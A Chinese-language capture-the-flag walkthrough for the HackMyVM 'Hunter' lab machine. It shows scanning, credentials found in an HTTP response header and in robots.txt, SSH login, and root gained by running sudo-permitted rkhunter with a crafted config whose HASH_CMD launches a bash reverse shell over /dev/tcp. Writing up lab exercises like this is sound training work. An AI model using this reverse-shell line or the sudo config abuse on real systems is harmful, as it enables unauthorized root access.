![image-20251119093713858](http://7r1UMPHK.github.io/image/20251119094332322.webp)

>**靶机地址**: https://hackmyvm.eu/machines/machine.php?vm=Hunter
>
>**难度**: 简单
>
>**作者**：sml

# 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 对目标网段进行扫描，以发现存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.135 08:00:27:35:1b:d0       PCS Systemtechnik GmbH
...
```

根据扫描结果，确定目标主机的 IP 地址为 `192.168.205.135`。

## 1.2 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 22:50 CST
Nmap scan report for 192.168.205.135
Host is up (0.00030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:35:1B:D0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

扫描发现目标开放了两个端口：

*   **22/tcp**: SSH 服务
*   **8080/tcp**: HTTP 服务

# 二、服务枚举与漏洞发现

## 2.1 HTTP 服务枚举

访问 `http://192.168.205.135:8080`，页面返回简单文本 "Yes, thats a CTF :_("。

使用 `feroxbuster` 对网站目录进行爆破，寻找隐藏路径。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ feroxbuster -q -u "http://192.168.205.135:8080" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html,zip,db,bak,js -t 64

200      GET        1l        2w       13c http://192.168.205.135:8080/admin
200      GET        2l        4w       31c http://192.168.205.135:8080/robots.txt
204      GET        0l        0w        0c http://192.168.205.135:8080/beacon
```

爆破发现了 `/admin` 和 `/robots.txt` 等路径。

*   访问 `/admin` 返回 "Invalid JWT."，暗示可能需要 JWT (JSON Web Token) 认证。
*   访问 `/robots.txt` 发现内容 `User-agent: * Disallow: /admin`。

## 2.2 发现凭证

尝试使用 `POST` 方法请求 `/admin` 路径，意外地在响应头中发现了一组凭证。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -X POST http://192.168.205.135:8080/admin -v
*   Trying 192.168.205.135:8080...
* Connected to 192.168.205.135 (192.168.205.135) port 8080
...
< HTTP/1.1 200 OK
< X-Secret-Creds: hunterman:thisisnitriilcisi
< Date: Tue, 18 Nov 2025 14:52:57 GMT
< Content-Length: 13
< Content-Type: text/plain; charset=utf-8
< 
Invalid JWT.
```

响应头 `X-Secret-Creds` 中包含用户名和密码：`hunterman:thisisnitriilcisi`。

# 三、获取初始立足点

使用获取到的凭证尝试 SSH 登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh hunterman@192.168.205.135
hunterman@192.168.205.135's password: thisisnitriilcisi
Welcome to Alpine!
...
hunter:~$ id
uid=1000(hunterman) gid=1000(hunterman) groups=1000(hunterman)
```

成功登录 `hunterman` 用户。在家目录下发现并读取了 `user.txt`。

```bash
hunter:~$ cat user.txt 
HMV{VcvaIKcezQVcvaIKcezQ}
```

# 四、权限提升

## 4.1 hunterman -> huntergirl

在检查 Web 服务器的根目录时，发现了一个 `robots.txt` 文件，其内容与通过 Web 访问看到的不同，包含了一组新的凭证。

```bash
hunter:/var/www/html$ cat robots.txt 
h u n t e r g i r l:fickshitmichini
```

这组凭证 `huntergirl:fickshitmichini` 属于另一个用户。使用 `su` 命令切换到 `huntergirl`。

```bash
hunter:/home$ su huntergirl
Password: fickshitmichini
/home $ id
uid=1001(huntergirl) gid=1001(huntergirl) groups=1001(huntergirl)
```

## 4.2 huntergirl -> root

检查 `huntergirl` 用户的 `sudo` 权限。

```bash
hunter:/home$ sudo -l
...
User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
```

发现 `huntergirl` 可以免密以 `root` 权限执行 `/usr/local/bin/rkhunter` 命令。`rkhunter` (Rootkit Hunter) 是一个用于检测后门和本地漏洞的工具。

通过查阅资料或使用 `rkhunter --help`，可以发现该命令支持 `--configfile` 参数，允许用户指定一个自定义的配置文件。 这为我们提供了一个潜在的攻击向量。通过在配置文件中设置恶意选项，并在执行 `rkhunter` 时加载该文件，我们可能能够以 root 权限执行任意代码。

在 `rkhunter` 的配置文件中，有一个名为 `HASH_CMD` 的选项，它用于指定生成文件哈希值的命令。我们可以利用这一点，将其指向一个恶意的反弹 shell 脚本。

> [!TIP]
>
> https://sources.debian.org/src/rkhunter/1.4.6-13/files/rkhunter.conf
>
> https://sources.debian.org/src/rkhunter/1.4.6-13/files/rkhunter
>
> https://sources.debian.org/data/main/r/rkhunter/1.4.6-13/installer.sh

1. **创建反弹 Shell 脚本**
   在 `/tmp` 目录下创建一个名为 `a.sh` 的脚本，用于连接到攻击机。

   ```bash
   hunter:/tmp$ echo 'bash -c "/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1"' > /tmp/a.sh
   hunter:/tmp$ chmod +x a.sh
   ```

2. **创建恶意配置文件**
   创建一个自定义的 `rkhunter.conf` 文件，将 `HASH_CMD` 指向我们刚刚创建的脚本。同时，为了避免程序因找不到默认路径而报错，需要根据目标系统的文件结构指定 `INSTALLDIR` 等变量。

   ```bash
   hunter:/tmp$ cat > /tmp/myconf.conf << EOF
   INSTALLDIR=/usr/local
   SCRIPTDIR=/usr/local/lib/rkhunter/scripts
   DBDIR=/var/lib/rkhunter/db
   TMPDIR=/var/lib/rkhunter/tmp
   HASH_CMD=/tmp/a.sh
   SCRIPTWHITELIST=
   EOF
   ```

3. **开启监听并执行命令**
   在攻击机上使用 `netcat` 开启 8888 端口的监听。

   ```bash
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ nc -lvnp 8888
   ```

   在目标机上，以 `root` 权限执行 `rkhunter`，使用 `--propupd`（更新文件属性数据库）参数来触发哈希命令的执行，并通过 `--configfile` 指定我们的恶意配置文件。

   ```bash
   hunter:/tmp$ sudo /usr/local/bin/rkhunter --propupd --configfile /tmp/myconf.conf
   ```

4. **获取 Root Shell**
   命令执行后，攻击机的 `netcat` 监听器成功接收到反弹 shell。

   ```bash
   listening on [any] 8888 ...
   connect to [192.168.205.128] from (UNKNOWN) [192.168.205.135] 36684
   hunter:/tmp# id
   uid=0(root) gid=0(root) groups=0(root),...
   ```

最后，读取 root flag，渗透测试完成。

```bash
hunter:/tmp# cat /root/root.txt
HMV{FhOpuXDUlZFhOpuXDUlZ}
```

